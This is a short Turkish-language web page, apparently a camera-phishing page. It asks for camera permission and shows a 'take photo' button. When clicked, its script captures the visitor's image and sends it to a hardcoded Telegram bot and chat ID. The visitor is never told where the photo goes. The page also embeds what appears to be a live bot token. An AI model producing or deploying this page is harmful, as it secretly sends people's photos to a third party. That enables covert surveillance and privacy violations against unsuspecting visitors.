<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kamera Fotoğrafı Gönder</title>
</head>
<body>
  <h2>Kamera izni verin ve fotoğraf çekin</h2>
  <video id="video" width="640" height="480" autoplay playsinline></video>
  <button id="takePhoto">Fotoğraf Çek</button>
  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const button = document.getElementById('takePhoto');

    const BOT_TOKEN = "8019450857:AAG1eQgjYVdQ26p4XH8HAdTdMLGHnAbYALY";  // Buraya kendi bot tokenını gir
    const CHAT_ID = "1149820913";  // Buraya kendi chat ID'ni gir

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
      } catch (error) {
        alert('Kamera erişimi reddedildi veya açılamadı: ' + error);
      }
    }

    document.addEventListener("DOMContentLoaded", startCamera);  // Sayfa yüklenince kamerayı aç

    button.onclick = () => {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Fotoğrafı blob formatına çevir
      canvas.toBlob(blob => {
        let formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "photo.png");

        // Fotoğrafı Telegram botuna gönder
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        })
        .then(response => response.json())
        .then(data => console.log('Fotoğraf Gönderildi:', data))
        .catch(error => console.error('Hata:', error));
      }, 'image/png');
    };
  </script>
</body>
</html>
